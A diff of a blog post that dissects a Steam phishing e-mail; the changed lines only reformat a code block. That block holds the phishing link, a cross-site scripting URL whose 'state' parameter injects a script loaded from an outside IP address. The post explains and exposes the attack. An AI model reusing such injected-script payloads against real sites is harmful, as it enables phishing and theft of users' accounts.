@@ -80,9 +80,8 @@
 <p>Needless to say, I was pretty surprised, I didn&#8217;t know Steam accounts could expire. Sure enough the e-mail looks legit, it&#8217;s mailed from support@steam.com, didn&#8217;t get caught by Gmail&#8217;s spam filter, and the corporate footer looks clean enough. If you have an eye for detail you might notice that there is a space missing here: &#8220;click&nbsp;here,login&#8221;.</p>
 <p>Let&#8217;s check where this link leads&nbsp;to:</p>
 <p><img alt="" src="http://4.bp.blogspot.com/_X4W-h82Vgjw/Su9Zd5oXnvI/AAAAAAAAPQY/jbSCOU8YTno/s400/Screenshot2.png"></p>
-<div class="highlight"><pre><span></span>https://cafe.steampowered.com/directory.php?country=AL<span class="ni">&amp;amp;</span>state=&#39;&gt;<span class="nt">&lt;script</span><span class="err">%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js</span><span class="nt">&gt;</span><span class="err">&lt;</span>/script%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js&gt;
-</pre></div>
-
+<div class="highlight"><pre><span></span><code>https://cafe.steampowered.com/directory.php?country=AL<span class="ni">&amp;amp;</span>state=&#39;<span class="ni">&amp;gt;</span><span class="nt">&lt;script</span><span class="err">%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js</span><span class="nt">&gt;</span><span class="err">&lt;</span>/script%20src%3dhttp://92.241.190.202/~faaaaaaa/phising/steam/iframe.js&gt;
+</code></pre></div>
 
 <p><span class="dquo">&#8220;</span>cafe.steampowered.com&#8221; certainly looks okay, but now it becomes clear that the state variable has been tampered with. It certainly points to an external script, and putting it in the &#8220;phising&#8221; folder really doesn&#8217;t look good&#8230; let&#8217;s open the link. Here&#8217;s how it looks in&nbsp;Chrome:</p>
 <p><img alt="" src="http://1.bp.blogspot.com/_X4W-h82Vgjw/Su9aZzEIxVI/AAAAAAAAPQg/vAbzAo3HsXw/s400/Screenshot3.png"></p>
